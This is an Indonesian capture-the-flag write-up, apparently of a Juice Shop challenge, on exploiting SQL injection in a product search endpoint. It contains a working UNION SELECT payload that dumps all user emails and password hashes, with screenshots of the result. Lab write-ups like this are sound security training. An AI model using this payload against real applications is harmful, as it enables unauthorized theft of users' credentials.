# Soal 8 – User Credentials

## 1. Pendahuluan
Challenge *User Credentials* termasuk kategori **Injection** dengan tingkat kesulitan ⭐⭐⭐⭐ (4/6).  
Tujuannya adalah mengeksploitasi SQL Injection pada fitur pencarian produk untuk mendapatkan daftar semua kredensial user (email dan password hash) dari database.

## 2. Identifikasi Titik Injeksi
Target challenge adalah endpoint pencarian produk:
GET /rest/products/search?q=<payload>
  
Hal ini menjadi indikasi bahwa parameter `q` rentan terhadap SQL Injection.
<img width="975" height="546" alt="image" src="https://github.com/user-attachments/assets/61af3a19-ca55-4cb3-98a8-9319349fe6dd" />


## 3. Penyusunan Payload
Untuk mengeksfiltrasi data user, digunakan teknik **UNION SELECT** dengan menyesuaikan jumlah kolom pada query asli.  
Setelah uji coba, ditemukan query membutuhkan **9 kolom** agar payload valid.

Payload final:
```sql
')) UNION SELECT 1, email || ' : ' || password, 'credentials', 3, 4, 'x', datetime('now'), datetime('now'), NULL FROM Users--
```
<img width="975" height="520" alt="image" src="https://github.com/user-attachments/assets/64f225d3-0b3e-4335-adff-042e4261d9b5" />

### 4. Eksploitasi

Masukkan payload di parameter q pada pencarian produk.

Aplikasi menampilkan entri palsu bernama credentials.

Pada kolom deskripsi, muncul hasil dump email dan password hash user.

<img width="975" height="517" alt="image" src="https://github.com/user-attachments/assets/498c07da-62f0-40c1-b27d-85d098d96533" />

![WhatsApp Image 2025-09-08 at 13 01 00_2895ff44](https://github.com/user-attachments/assets/0910811e-14d8-48f5-ac73-f40e752e56c1)
